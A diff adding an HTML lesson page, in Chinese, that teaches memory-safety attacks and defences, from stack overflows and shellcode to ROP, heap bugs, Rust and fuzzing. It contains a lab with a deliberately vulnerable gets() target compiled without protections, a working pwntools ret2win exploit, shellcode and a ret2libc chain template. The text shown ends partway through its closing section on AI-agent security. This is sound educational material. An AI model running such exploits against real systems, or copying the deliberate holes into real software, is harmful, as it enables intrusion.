@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Day 41 · 🔐 内存安全攻防</title>
+<style>
+  :root {
+    --bg: #fff7ed;
+    --ink: #2a2a2a;
+    --muted: #6b6b6b;
+    --accent: #c2410c;
+    --accent-soft: #fed7aa;
+    --line: #e7e5e0;
+    --card: #ffffff;
+    --code-bg: #fef3e2;
+    --sec-border: #fdba74;
+    --danger: #dc2626;
+    --danger-bg: #fee2e2;
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
+    background: var(--bg);
+    color: var(--ink);
+    line-height: 1.78;
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 32px 80px;
+  }
+  .header {
+    background: var(--card);
+    border: 1px solid var(--sec-border);
+    border-left: 6px solid var(--accent);
+    border-radius: 6px;
+    padding: 20px 24px;
+    margin-bottom: 28px;
+  }
+  .header h1 { font-size: 22px; margin: 0 0 8px; color: var(--accent); }
+  .header .meta { font-size: 13px; color: var(--muted); font-family: ui-monospace, "SF Mono", monospace; }
+  .header .sec-tag { display: inline-block; background: var(--accent); color: white; padding: 2px 10px; border-radius: 3px; font-size: 11px; margin-bottom: 8px; letter-spacing: 1px; }
+  .toc { background: var(--card); border: 1px solid var(--sec-border); border-radius: 6px; padding: 14px 20px; margin: 0 0 32px; font-size: 13.5px; }
+  .toc ol { margin: 4px 0; padding-left: 24px; }
+  .toc a { color: var(--accent); text-decoration: none; }
+  .leadin { background: var(--card); border-left: 3px solid var(--accent); padding: 14px 18px; border-radius: 4px; margin: 0 0 36px; font-size: 15px; }
+  h2 { font-size: 20px; margin-top: 48px; color: var(--accent); border-left: 4px solid var(--accent); padding-left: 12px; }
+  h3 { font-size: 16.5px; margin-top: 24px; color: #444; }
+  p { margin: 12px 0; }
+  code { background: var(--code-bg); padding: 1px 6px; border-radius: 3px; font-size: 13.5px; font-family: ui-monospace, "SF Mono", monospace; }
+  pre { background: var(--code-bg); padding: 14px 16px; border-radius: 6px; overflow-x: auto; font-size: 13.5px; line-height: 1.55; margin: 16px 0; border: 1px solid var(--sec-border); }
+  pre code { background: transparent; padding: 0; font-size: inherit; }
+  .ascii { font-family: ui-monospace, "SF Mono", monospace; font-size: 13px; background: var(--code-bg); padding: 16px 20px; border-radius: 6px; white-space: pre; overflow-x: auto; line-height: 1.4; margin: 18px 0; border: 1px solid var(--sec-border); }
+  table { border-collapse: collapse; width: 100%; margin: 16px 0; font-size: 14px; }
+  th, td { border: 1px solid var(--sec-border); padding: 10px 12px; text-align: left; vertical-align: top; }
+  th { background: var(--code-bg); font-weight: 600; }
+  .warn { background: var(--danger-bg); border-left: 4px solid var(--danger); padding: 10px 14px; font-size: 14px; border-radius: 3px; margin: 14px 0; }
+  .warn strong { color: var(--danger); }
+  .note { background: var(--card); border-left: 4px solid var(--accent-soft); padding: 12px 18px; border-radius: 4px; margin: 18px 0; font-size: 14.5px; }
+  .attack { background: #fef2f2; border: 1px solid #fecaca; border-left: 4px solid var(--danger); padding: 14px 18px; border-radius: 4px; margin: 18px 0; }
+  .attack h3 { margin-top: 4px; color: var(--danger); }
+  .connect { background: var(--card); border-left: 4px solid var(--accent); padding: 18px 22px; border-radius: 4px; margin: 36px 0; }
+  .connect h2 { margin-top: 0; border-left: none; padding-left: 0; }
+  .exercise { background: var(--card); border: 1px solid var(--sec-border); border-radius: 6px; padding: 18px 22px; margin: 16px 0; }
+  .exercise-num { display: inline-block; background: var(--accent); color: white; width: 22px; height: 22px; border-radius: 50%; text-align: center; font-size: 12px; line-height: 22px; margin-right: 8px; }
+  .next { margin-top: 48px; padding: 14px 18px; background: var(--card); border: 1px dashed var(--accent); border-radius: 4px; font-size: 14px; color: var(--muted); }
+  .next strong { color: var(--accent); }
+  .key { background: linear-gradient(transparent 60%, var(--accent-soft) 60%); padding: 0 2px; }
+  .term { color: var(--accent); font-weight: 600; }
+  ul, ol { padding-left: 24px; }
+  li { margin: 4px 0; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="sec-tag">🔐 SECURITY · 周六安全主线</div>
+  <h1>Day 41 · 内存安全攻防：从栈溢出到 ROP</h1>
+  <div class="meta">Week 06 · 周六 · 2026-08-17 · 安全主线：二进制内存漏洞 · 预计 4 小时（含 1.5h 动手 lab）</div>
+</div>
+
+<div class="leadin">
+<strong>今日导读</strong>：本周你已经理解了内存层级、NUMA、以及「为什么 LLM 推理是 memory-bound」。今天我们换一个视角看同一块内存——<span class="key">当程序把「数据」误当作「代码」执行时，会发生什么？</span> 这就是内存安全漏洞的本质。从 1988 年 Morris 蠕虫用的第一个栈溢出，到今天 CTF 和 0-day 里满天飞的 ROP 链，攻击与防御打了 40 年的军备竞赛：攻击者发明缓冲区溢出，防御方上 <code>canary</code>；攻击者绕过 canary 改用 <code>ret2libc</code>，防御方上 <code>NX</code>；攻击者发明 <code>ROP</code> 绕过 NX，防御方上 <code>ASLR</code>+<code>PIE</code>+<code>CFI</code>……今天我们把这条时间线完整走一遍，理解每一层缓解措施「防的是什么、又是怎么被绕过的」。这不仅是 CTF 技能——你做 Agent 安全，沙箱里跑的是 C/C++ 写的推理引擎（vLLM 的 CUDA kernel、llama.cpp），<strong>一个内存越界就是逃逸的起点</strong>。今天所有 PoC 都在你自己的机器 / 容器里、针对你自己写的靶子程序做,纯教学用途。</div>
+
+<div class="toc">
+<strong>今日目录（4 小时分配）</strong>
+<ol>
+  <li><a href="#s1">栈帧：函数调用在内存里长什么样（40 min）</a></li>
+  <li><a href="#s2">经典栈溢出：覆盖返回地址（40 min）</a></li>
+  <li><a href="#s3">Shellcode：把数据变成代码（25 min）</a></li>
+  <li><a href="#s4">四道防线：Canary / NX / ASLR / PIE / CFI（45 min）</a></li>
+  <li><a href="#s5">ROP / JOP：用程序自己的碎片攻击（35 min）</a></li>
+  <li><a href="#s6">堆漏洞：UAF / double free / 堆溢出（30 min）</a></li>
+  <li><a href="#s7">根治思路：Rust 借用检查器 + Fuzzing（25 min）</a></li>
+  <li><a href="#s8">动手 LAB：栈溢出 PoC 全流程（90 min）</a></li>
+  <li><a href="#connect">与 AI / Agent 安全的连结</a></li>
+  <li><a href="#exercise">今日小练习</a></li>
+</ol>
+</div>
+
+<h2 id="s1">1. 栈帧：函数调用在内存里长什么样</h2>
+
+<p>要理解内存漏洞，你必须先在脑子里建立一张<strong>清晰的栈（stack）内存布局图</strong>。Day 01 讲进程地址空间时提过栈，今天我们把它放大 100 倍看细节。</p>
+
+<h3>1.1 进程地址空间回顾</h3>
+
+<p>一个运行中的进程，它的虚拟地址空间从低地址到高地址大致是这样布局的（x86-64 Linux）：</p>
+
+<div class="ascii">高地址 0x7fff...
+┌────────────────────────┐
+│         栈 Stack        │  ← 局部变量、返回地址，向下增长 ↓
+│           ↓            │
+│                        │
+│           ↑            │
+│      内存映射 mmap       │  ← 共享库(libc)、mmap 大块内存
+│                        │
+│           ↑            │
+│        堆 Heap          │  ← malloc 分配，向上增长 ↑
+├────────────────────────┤
+│    BSS (未初始化全局)     │
+│   Data (已初始化全局)     │
+│    Text (代码, 只读)      │  ← 你的程序指令
+└────────────────────────┘
+低地址 0x0000...</div>
+
+<p>注意两个关键事实：<span class="key">栈向下增长（地址递减），而缓冲区（数组）向上写入（地址递增）</span>——这个「方向相反」正是栈溢出能覆盖返回地址的物理根源。</p>
+
+<h3>1.2 一次函数调用，栈上发生了什么</h3>
+
+<p>类比：把栈想象成一摞餐盘。每调用一个函数，就往上叠一个「盘子」（<span class="term">栈帧 stack frame</span>）；函数返回，就把盘子拿走。每个栈帧里装着这个函数的局部变量、参数、以及最关键的——<strong>返回地址</strong>（调用结束后该跳回哪条指令）。</p>
+
+<p>看这段 C 代码：</p>
+
+<pre><code>void vuln(char *input) {
+    char buf[64];        // 局部数组，64 字节
+    strcpy(buf, input);  // 不检查长度地拷贝！
+}
+int main(int argc, char **argv) {
+    vuln(argv[1]);
+    return 0;
+}</code></pre>
+
+<p>当 <code>main</code> 调用 <code>vuln</code> 时，栈上（x86-64，简化）从高到低是这样的：</p>
+
+<div class="ascii">高地址
+┌──────────────────────┐
+│  main 的栈帧 ...       │
+├──────────────────────┤
+│  返回地址(回到 main)    │  ← 8 字节：call 指令自动压入
+├──────────────────────┤
+│  保存的 RBP (旧帧指针)  │  ← 8 字节：函数开头 push rbp
+├──────────────────────┤
+│                      │
+│   buf[64]            │  ← strcpy 从这里开始往高地址写 ↑
+│                      │
+└──────────────────────┘
+低地址   ← RSP 栈顶
+</div>
+
+<p>关键点：<code>buf</code> 在<strong>低地址</strong>，返回地址在<strong>高地址</strong>。<code>strcpy</code> 从 <code>buf</code> 起点往高地址方向拷贝。如果 <code>input</code> 超过 64+8（buf + 旧 RBP）字节，多出来的字节就会<span class="key">覆盖掉返回地址</span>。</p>
+
+<h3>1.3 用 GDB 亲眼看栈帧</h3>
+
+<pre><code>gcc -g -fno-stack-protector -o demo demo.c   # 先关掉 canary 方便观察
+gdb ./demo
+(gdb) break vuln
+(gdb) run AAAA
+(gdb) info frame          # 看当前帧的返回地址位置
+(gdb) x/20gx $rsp         # 以 16 进制看栈顶 20 个 8 字节
+(gdb) p &buf              # buf 的地址
+(gdb) p $rbp              # 帧指针</code></pre>
+
+<div class="note"><strong>关键事实</strong>
+<ul>
+<li>x86-64 下 <code>call</code> 指令自动把「下一条指令地址」压栈作为返回地址，<code>ret</code> 指令则把栈顶弹出到 <code>RIP</code> 并跳转。</li>
+<li>寄存器约定：<code>RSP</code>=栈顶指针，<code>RBP</code>=帧基指针，<code>RIP</code>=指令指针（下一条要执行的指令）。</li>
+<li>控制了返回地址，就等于<strong>控制了 RIP</strong>，也就控制了 CPU 接下来执行哪里——这是所有控制流劫持的目标。</li>
+</ul>
+</div>
+
+<h2 id="s2">2. 经典栈溢出：覆盖返回地址</h2>
+
+<p><span class="term">缓冲区溢出（buffer overflow）</span>：向一个固定大小的缓冲区写入超过其容量的数据，多余数据溢出到相邻内存。当溢出发生在栈上、且覆盖到返回地址时，就叫<strong>栈溢出（stack overflow，注意和递归爆栈是两回事）</strong>。</p>
+
+<h3>2.1 攻击三步曲</h3>
+
+<ol>
+<li><strong>找溢出点</strong>：任何不检查长度的写入——<code>strcpy</code>、<code>gets</code>、<code>sprintf</code>、<code>memcpy</code> 长度可控、<code>scanf("%s")</code>。</li>
+<li><strong>算偏移</strong>：从缓冲区起点到返回地址有多少字节？（buf 大小 + 对齐 + 8 字节旧 RBP）</li>
+<li><strong>放 payload</strong>：填充 N 个垃圾字节把偏移填满，然后放上你想跳转的目标地址。</li>
+</ol>
+
+<h3>2.2 精确算偏移：cyclic 模式</h3>
+
+<p>手算偏移容易错。pwntools 提供了「循环模式」：生成一段不重复的字符串，崩溃后看 RIP 里是哪 4 个字符，反查偏移。</p>
+
+<pre><code>from pwn import *
+# 生成 200 字节唯一模式串（每 4 字节子串都唯一）
+pattern = cyclic(200)
+# 程序崩溃后，看 RIP/RSP 里的值，比如 0x6161616c ('laaa')
+offset = cyclic_find(0x6161616c)   # 直接算出偏移
+print(offset)</code></pre>
+
+<h3>2.3 最简单的利用：ret2win</h3>
+
+<p>CTF 入门题常有个「后门函数」（比如 <code>win()</code> 会 <code>system("/bin/sh")</code>），你只要把返回地址覆盖成 <code>win</code> 的地址即可：</p>
+
+<pre><code>from pwn import *
+elf = ELF('./demo')
+p = process('./demo')
+offset = 72                         # buf(64) + rbp(8)
+payload = b'A' * offset + p64(elf.symbols['win'])
+p.sendline(payload)
+p.interactive()                    # 弹 shell</code></pre>
+
+<div class="warn"><strong>为什么这在真实世界依然重要</strong>：你可能觉得「谁还写 strcpy」。但 2021 年 <code>sudo</code> 的 Baron Samedit（CVE-2021-3156）就是一个存在了 10 年的堆溢出；OpenSSL、curl、各种 IoT 固件里的溢出漏洞每年都有几十个 CVE。C/C++ 只要还在写系统底层，内存漏洞就不会消失。</div>
+
+<h2 id="s3">3. Shellcode：把数据变成代码</h2>
+
+<p>如果没有现成的 <code>win()</code> 函数怎么办？攻击者可以自己<strong>把机器码作为数据写进缓冲区</strong>，再把返回地址指向缓冲区。这段自带的机器码就是 <span class="term">shellcode</span>——因为它经典目标是启动一个 shell。</p>
+
+<h3>3.1 shellcode 长什么样</h3>
+
+<p>一段最小的 x86-64 「执行 <code>/bin/sh</code>」shellcode 本质是几条系统调用指令的机器码：</p>
+
+<pre><code># 汇编逻辑（execve("/bin/sh", NULL, NULL)）
+xor rsi, rsi           # argv = NULL
+push rsi
+mov rdi, 0x68732f2f6e69622f   # "/bin//sh" 压栈
+push rdi
+mov rdi, rsp           # rdi 指向字符串
+xor rdx, rdx           # envp = NULL
+push 0x3b              # syscall 号 59 = execve
+pop rax
+syscall</code></pre>
+
+<p>编成机器码后就是一串字节 <code>\x48\x31\xf6...</code>，长度约 20-30 字节。pwntools 一行生成：</p>
+
+<pre><code>from pwn import *
+context.arch = 'amd64'
+sc = asm(shellcraft.sh())   # 自动生成 execve("/bin/sh") 的字节
+print(len(sc), sc.hex())</code></pre>
+
+<h3>3.2 经典布局：NOP sled + shellcode</h3>
+
+<p>问题：栈地址不完全可预测（尤其有 ASLR），返回地址不一定精确落在 shellcode 第一字节。解法是 <span class="term">NOP 滑板（NOP sled）</span>——在 shellcode 前放一大串 <code>\x90</code>（NOP，什么都不做，执行下一条），只要返回地址落在滑板任意位置，CPU 就会一路「滑」到 shellcode：</p>
+
+<div class="ascii">[ NOP NOP NOP ... NOP ][ shellcode ][ 填充 ][ 返回地址→指向滑板中部 ]
+        ↑ 落在这一大片区域任意处都行
+</div>
+
+<div class="warn"><strong>但是——</strong>这种「把 shellcode 放栈上执行」的经典打法，在现代系统上<strong>默认失效</strong>。因为栈被标记为「不可执行」（NX，下一节）。理解它是为了理解后面所有缓解措施在防什么。</div>
+
+<h2 id="s4">4. 四道防线：Canary / NX / ASLR / PIE / CFI</h2>
+
+<p>过去 20 年，编译器和操作系统层层加防。理解这些缓解措施，是理解现代二进制利用（以及为什么 exploit 越来越难写）的核心。</p>
+
+<h3>4.1 Stack Canary（栈金丝雀）</h3>
+
+<p>类比：矿工下井带只金丝雀，金丝雀先死说明有毒气。编译器在<strong>返回地址前面</strong>插入一个随机值（canary），函数返回前检查它有没有被改。栈溢出要覆盖返回地址，必然先覆盖 canary，检查失败就 <code>__stack_chk_fail</code> 直接终止程序。</p>
+
+<div class="ascii">┌──────────────┐
+│  返回地址      │
+├──────────────┤
+│  saved RBP    │
+├──────────────┤
+│  🐤 CANARY    │  ← 随机值，返回前校验
+├──────────────┤
+│  buf[64]      │  ← 溢出必先穿过 canary
+└──────────────┘</div>
+
+<p><strong>怎么绕过</strong>：① <em>泄露</em> canary 值（用格式化字符串漏洞或另一个读越界读出来），再原样写回去；② 绕过校验（如果能直接改写别的指针不碰返回地址）；③ 暴力（32 位 fork 服务器，canary 不变时逐字节爆破）。</p>
+
+<h3>4.2 NX / DEP（数据执行保护）</h3>
+
+<p><span class="term">NX（No-eXecute）位</span>：CPU 页表给每页内存加一个「可执行」标记。栈和堆被标记为<strong>不可执行</strong>，代码段标记为<strong>不可写</strong>。于是「把 shellcode 写到栈上执行」直接触发段错误。这就是 §3 经典打法失效的原因。</p>
+
+<p><strong>怎么绕过</strong>：不注入新代码，而是<strong>复用程序里已有的代码片段</strong>——这就是 ret2libc 和 ROP（§5）。这是攻防史上最漂亮的一次范式转移：既然不让我带新代码，我就用你自己的零件拼。</p>
+
+<h3>4.3 ASLR（地址空间布局随机化）</h3>
+
+<p><span class="term">ASLR</span>：每次运行，把栈、堆、共享库（libc）、mmap 区域的<strong>基地址随机化</strong>。这样攻击者无法预知「libc 里 <code>system</code> 函数在哪」「shellcode 在栈的哪个地址」。</p>
+
+<pre><code># 查看/临时关闭 ASLR（需 root，仅实验用）
+cat /proc/sys/kernel/randomize_va_space   # 2=完全开启
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  # 关闭(教学)
+# 或单进程关闭：
+setarch $(uname -m) -R ./demo</code></pre>
+
+<p><strong>怎么绕过</strong>：① <em>信息泄露</em>——先泄露一个 libc 地址，减去已知偏移算出 libc 基址（这叫「打 libc」）；② 未开 PIE 的程序，代码段地址固定，可直接 ROP；③ 32 位熵低可爆破。</p>
+
+<h3>4.4 PIE（位置无关可执行）</h3>
+
+<p>ASLR 只随机化库和栈堆；<strong>程序自身的代码段（Text）默认地址固定</strong>。<span class="term">PIE</span> 让程序自己也能被加载到随机地址，配合 ASLR 就连你自己的函数地址也随机了。现代 gcc 默认开启 PIE。</p>
+
+<h3>4.5 CFI（控制流完整性）</h3>
+
+<p><span class="term">CFI（Control-Flow Integrity）</span>：更现代的防线。它在编译期算出「合法的间接跳转目标集合」，运行时检查每一次间接调用/返回是否跳到了合法目标。ROP 把返回地址改成 gadget 中间，CFI 一看「这不是合法的函数入口」就拦截。Clang 的 <code>-fsanitize=cfi</code>、Intel CET 的影子栈（shadow stack）和 ARM 的 PAC/BTI 都是这个思路的硬件/软件实现。</p>
+
+<h3>4.6 一张表看全</h3>
+
+<table>
+<tr><th>防线</th><th>防什么</th><th>典型绕过</th><th>如何查</th></tr>
+<tr><td>Canary</td><td>覆盖返回地址</td><td>泄露/爆破 canary</td><td><code>checksec</code></td></tr>
+<tr><td>NX/DEP</td><td>栈上执行 shellcode</td><td>ret2libc / ROP</td><td><code>checksec</code></td></tr>
+<tr><td>ASLR</td><td>预测地址</td><td>信息泄露算基址</td><td><code>/proc/.../maps</code></td></tr>
+<tr><td>PIE</td><td>代码段地址固定</td><td>泄露程序基址</td><td><code>checksec</code></td></tr>
+<tr><td>CFI</td><td>非法间接跳转</td><td>数据流攻击/未覆盖路径</td><td>编译选项</td></tr>
+</table>
+
+<pre><code># 一键查看一个二进制开了哪些防护（pwntools 自带）
+checksec ./demo
+# 或用 pwntools:  python -c "from pwn import *; print(ELF('./demo').checksec())"</code></pre>
+
+<h2 id="s5">5. ROP / JOP：用程序自己的碎片攻击</h2>
+
+<p>NX 让你无法注入代码，于是攻击者发明了 <span class="term">ROP（Return-Oriented Programming，面向返回编程）</span>：不注入任何新指令，而是把程序（和 libc）里<strong>已有的、以 <code>ret</code> 结尾的小片段</strong>（叫 <span class="term">gadget</span>）串起来，用一连串精心排布的返回地址，把这些碎片拼成任意逻辑。</p>
+
+<h3>5.1 gadget 是什么</h3>
+
+<p>一个 gadget 就是几条指令 + 一个 <code>ret</code>，例如：</p>
+
+<pre><code>pop rdi ; ret         # 把栈上下一个值弹进 rdi，然后返回
+pop rsi ; pop r15 ; ret
+mov [rdi], rax ; ret</code></pre>
+
+<p>攻击者在栈上排布：<code>[pop rdi;ret 的地址][想放进 rdi 的值][下一个 gadget 地址]...</code>。每个 <code>ret</code> 都从栈上取下一个地址跳过去，栈就成了「程序」，gadget 是「指令」。</p>
+
+<h3>5.2 经典 ROP 目标：ret2libc 拿 shell</h3>
+
+<p>最常见的 ROP 目标是调用 libc 的 <code>system("/bin/sh")</code>。x86-64 调用约定第一个参数放 <code>rdi</code>，所以经典链是：</p>
+
+<pre><code>from pwn import *
+elf = ELF('./demo'); libc = ELF('./libc.so.6')
+# 假设已泄露 libc 基址 → 算出 system 和 "/bin/sh" 地址
+system   = libc_base + libc.symbols['system']
+binsh    = libc_base + next(libc.search(b'/bin/sh'))
+pop_rdi  = base + 0x... # ROPgadget 找到的 "pop rdi; ret"
+ret      = base + 0x... # 一个纯 ret，用于 16 字节栈对齐
+
+payload  = b'A'*offset
+payload += p64(pop_rdi) + p64(binsh)   # rdi = "/bin/sh"
+payload += p64(ret)                    # 对齐
+payload += p64(system)                 # 调 system(rdi)
+p.sendline(payload); p.interactive()</code></pre>
+
+<p>找 gadget 的工具：</p>
+
+<pre><code>ROPgadget --binary ./demo | grep "pop rdi"
+# 或 ropper --file ./demo --search "pop rdi"</code></pre>
+
+<h3>5.3 JOP 与其它变种</h3>
+
+<p><span class="term">JOP（Jump-Oriented Programming）</span>：用 <code>jmp</code> 结尾的 gadget 代替 <code>ret</code>，专门绕过「影子栈」这类只保护返回地址的 CFI。此外还有 <code>ret2csu</code>（利用 libc 初始化代码控制多个寄存器）、<code>sigreturn</code>-oriented（SROP，伪造信号帧一次性设置所有寄存器）。这些是同一思想的延伸：<strong>控制流被劫持后，用现存代码拼出任意能力</strong>。</p>
+
+<div class="note"><strong>攻防军备竞赛时间线（记住这条线，面试常问）</strong>：
+栈溢出 → <strong>Canary</strong> → 泄露 canary → <strong>NX</strong> → ret2libc/ROP → <strong>ASLR</strong> → 信息泄露 → <strong>PIE</strong> → 泄露程序基址 → <strong>CFI/CET 影子栈</strong> → JOP/数据流攻击。每一层都不是「彻底解决」，而是「抬高攻击成本」。</div>
+
+<h2 id="s6">6. 堆漏洞：UAF / double free / 堆溢出</h2>
+
+<p>栈之外，<code>malloc</code>/<code>free</code> 管理的<strong>堆（heap）</strong>是另一大战场。堆漏洞比栈更复杂，因为它涉及分配器（Day 09 讲过的 ptmalloc/glibc malloc）的内部数据结构。</p>
+
+<h3>6.1 三类核心堆漏洞</h3>
+
+<div class="attack">
+<h3>Use-After-Free (UAF)</h3>
+<p>释放一块内存后继续使用那个指针（<span class="term">悬垂指针 dangling pointer</span>）。如果攻击者能在 free 之后、使用之前重新 <code>malloc</code> 占据同一块内存并填入可控数据，就能劫持后续操作。浏览器漏洞（V8、WebKit）的头号来源。</p>
+<pre><code>char *p = malloc(64);
+free(p);              // p 现在悬垂
+// ... 攻击者让程序 malloc(64) 拿到同一块，写入伪造数据
+strcpy(p, "attacker");  // 用了已释放的内存 → 灾难</code></pre>
+</div>
+
+<div class="attack">
+<h3>Double Free（重复释放）</h3>
+<p>对同一指针 <code>free</code> 两次。会破坏分配器的空闲链表（free list），攻击者可借此实现「任意地址分配」——让下一次 <code>malloc</code> 返回一个他指定的地址，从而改写关键指针（如 GOT 表、函数指针）。</p>
+<pre><code>free(p);
+free(p);   // glibc 新版有 tcache double-free 检测，但老版本/绕过手法很多</code></pre>
+</div>
+
+<div class="attack">
+<h3>堆溢出（Heap Overflow）</h3>
+<p>写超出 malloc 块边界，覆盖<strong>相邻块的元数据</strong>（chunk header 里的 size、fd/bk 指针）。经典的 unlink 攻击、House of XXX 系列（House of Force / Spirit / Einherjar…）都是操纵这些元数据实现任意写。</p>
+</div>
+
+<h3>6.2 为什么堆利用更难也更稳</h3>
+
+<p>难：需要「堆风水（heap feng shui / grooming）」——精确控制分配和释放的顺序，让目标块落在你能预测的位置。稳：一旦掌控 malloc 的返回，往往能实现「任意地址写任意值」（write-what-where），这是最强的原语，几乎必然能提权或 RCE。</p>
+
+<pre><code># glibc 堆调试利器
+pip install pwndbg   # GDB 插件，heap/bins/chunk 命令一目了然
+# 在 gdb 里：
+(gdb) heap          # 查看当前堆布局
+(gdb) bins          # 查看各 free list (tcache/fastbin/...)
+(gdb) vis_heap_chunks</code></pre>
+
+<h2 id="s7">7. 根治思路：Rust 借用检查器 + Fuzzing</h2>
+
+<p>前面所有缓解措施都是「打补丁」——抬高成本但没根除。真正想从源头消灭内存漏洞，有两条路：<strong>换语言</strong>和<strong>自动找 bug</strong>。</p>
+
+<h3>7.1 Rust：把内存安全编进类型系统</h3>
+
+<p>C 的问题是：谁拥有这块内存、什么时候释放、能不能同时读写——全靠程序员脑子记，记错就是漏洞。Rust 的 <span class="term">所有权（ownership）+ 借用（borrowing）</span> 把这些规则变成<strong>编译期强制检查</strong>：</p>
+
+<ul>
+<li><strong>所有权</strong>：每个值有唯一的所有者，所有者离开作用域，值自动释放（无需 GC，也不会忘记 free）。</li>
+<li><strong>移动语义</strong>：值转移后原变量失效，编译器禁止你再用——从根上杜绝 UAF 和 double free。</li>
+<li><strong>借用规则</strong>：要么有多个不可变引用（<code>&T</code>），要么只有一个可变引用（<code>&mut T</code>），二者不可兼得——编译期消灭数据竞争。</li>
+</ul>
+
+<pre><code>fn main() {
+    let s = String::from("hi");
+    let s2 = s;              // 所有权移动到 s2
+    // println!("{}", s);   // ❌ 编译错误：s 已被移动，用不了
+    println!("{}", s2);     // ✅
+}</code></pre>
+
+<p>这就是微软、Google、Linux 内核、以及 Cloudflare 大规模转向 Rust 的原因：微软统计其 CVE 约 <span class="key">70% 是内存安全问题</span>，Rust 能在编译期消灭其中绝大部分。代价是学习曲线陡（要跟借用检查器「搏斗」）和 <code>unsafe</code> 块仍是逃生舱（需人工审计）。</p>
+
+<h3>7.2 Fuzzing：让机器自动喂垃圾找崩溃</h3>
+
+<p><span class="term">模糊测试（fuzzing）</span>：自动生成大量畸形/随机输入喂给程序，监控崩溃。配合 <code>ASan</code>（AddressSanitizer，运行时检测越界/UAF）能把「隐性内存错误」变成「明确崩溃」。这是现代找 0-day 的主力。</p>
+
+<pre><code># 用 AFL++ 或 libFuzzer + AddressSanitizer
+clang -fsanitize=address,fuzzer -g harness.c -o fuzzer
+./fuzzer -max_len=256          # 自动跑，崩溃即 dump crash 输入
+
+# ASan 单独用（编译时加，运行即报越界）
+gcc -fsanitize=address -g demo.c -o demo && ./demo AAAA...</code></pre>
+
+<p>Google 的 OSS-Fuzz 项目 7×24 fuzz 上千个开源库，已发现数万个 bug。<strong>「写内存不安全的语言时，fuzzing 不是可选项，是必需项」</strong>。</p>
+
+<h2 id="s8">8. 动手 LAB：栈溢出 PoC 全流程（90 min）</h2>
+
+<div class="warn"><strong>⚠️ 授权与边界</strong>：本 lab 全程在<strong>你自己的机器 / 一次性 Docker 容器</strong>里、针对<strong>你自己写的靶子程序</strong>操作，纯教学。不要对任何非自有系统尝试。建议用容器隔离：<code>docker run -it --rm -v $PWD:/w -w /w ubuntu:22.04 bash</code>。</div>
+
+<h3>Lab 0：装工具</h3>
+<pre><code>apt update && apt install -y gcc gdb python3-pip binutils
+pip3 install pwntools ropgadget
+# 可选强烈推荐：pwndbg
+git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh</code></pre>
+
+<h3>Lab 1：写一个带后门的靶子</h3>
+<pre><code>cat > vuln.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void win() {                       // 后门函数
+    printf("[+] You win! Spawning shell...\n");
+    system("/bin/sh");
+}
+void vuln() {
+    char buf[64];
+    printf("Give me input: ");
+    gets(buf);                     // 危险！不检查长度
+}
+int main() {
+    setvbuf(stdout, 0, 2, 0);
+    vuln();
+    printf("Normal exit.\n");
+    return 0;
+}
+EOF
+# 关掉 canary + NX + PIE，制造经典可利用环境
+gcc -fno-stack-protector -z execstack -no-pie -g vuln.c -o vuln
+checksec vuln       # 确认 No canary / NX disabled / No PIE</code></pre>
+
+<h3>Lab 2：确认崩溃 + 算偏移</h3>
+<pre><code># 生成 cyclic 模式喂进去，观察崩在哪
+python3 -c "from pwn import *; print(cyclic(200).decode())" | ./vuln
+# 用 gdb 看崩溃时的 RSP/RIP
+gdb ./vuln
+(gdb) run &lt;&lt;&lt; "$(python3 -c 'from pwn import *; import sys; sys.stdout.buffer.write(cyclic(200))')"
+# 崩溃后：
+(gdb) x/gx $rsp
+# 假设看到 0x616161...，用 cyclic_find 反查偏移
+python3 -c "from pwn import *; print(cyclic_find(0x6161616161616166))"</code></pre>
+
+<h3>Lab 3：ret2win 利用脚本</h3>
+<pre><code>cat > exploit.py &lt;&lt;'EOF'
+from pwn import *
+elf = ELF('./vuln')
+p   = process('./vuln')
+offset = 72                          # 用 Lab2 算出的真实偏移替换
+win = elf.symbols['win']
+log.info(f"win @ {hex(win)}")
+payload = b'A'*offset + p64(win)
+p.recvuntil(b'input: ')
+p.sendline(payload)
+p.interactive()                      # 应该拿到 shell
+EOF
+python3 exploit.py
+# 成功的话，输入 id / ls 验证是 shell</code></pre>
+
+<h3>Lab 4：观察防护开启后的失败</h3>
+<pre><code># 重新编译，这次开启所有默认防护
+gcc -g vuln.c -o vuln_safe          # 默认开 canary + NX + PIE
+checksec vuln_safe
+python3 -c "from pwn import *; p=process('./vuln_safe'); p.sendline(b'A'*200); print(p.recvall())"
+# 观察：会看到 "*** stack smashing detected ***" —— canary 生效了</code></pre>
+
+<h3>Lab 5（进阶，选做）：ASan 抓 UAF</h3>
+<pre><code>cat > uaf.c &lt;&lt;'EOF'
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+int main(){
+    char *p = malloc(64);
+    free(p);
+    strcpy(p, "use after free");   // ASan 会精确报出这一行
+    return 0;
+}
+EOF
+gcc -fsanitize=address -g uaf.c -o uaf && ./uaf
+# 阅读 ASan 报告：它会告诉你 "freed by" 和 "allocated by" 的调用栈</code></pre>
+
+<div class="note"><strong>Lab 复盘要点</strong>：Lab 3 成功、Lab 4 失败——这个对比就是今天的核心。<span class="key">同一个漏洞，在「无防护」和「全防护」下的攻击难度差了几个数量级</span>。真实 exploit 开发的 90% 工作量，是绕过 Lab 4 里那些防护（泄露 canary、泄露 libc、构造 ROP 链）。</div>
+
+<div class="connect" id="connect">
+<h2>🔗 与 AI / Agent 安全的连结</h2>
+
+<p><strong>1. 推理引擎是 C/C++ 写的，内存漏洞就是逃逸起点。</strong> 你日常打交道的 vLLM、llama.cpp、TensorRT-LLM、以及底层的 CUDA kernel，全是 C/C++/CUDA。一个精心构造的超长 prompt、畸形的 GGUF 模型文件、或恶意的 tokenizer 配置，如果触发解析代码里的堆溢出，攻击者就可能在推理进程里执行任意代码——直接从「模型输入」升级到「主机 RCE」。2024 年 llama.cpp、ollama 都爆过 GGUF 解析相关的内存漏洞。做 Agent 安全，你得把「模型文件/输入」当成不可信数据，用今天讲的 fuzzing 思路去测这些解析器。</p>
+
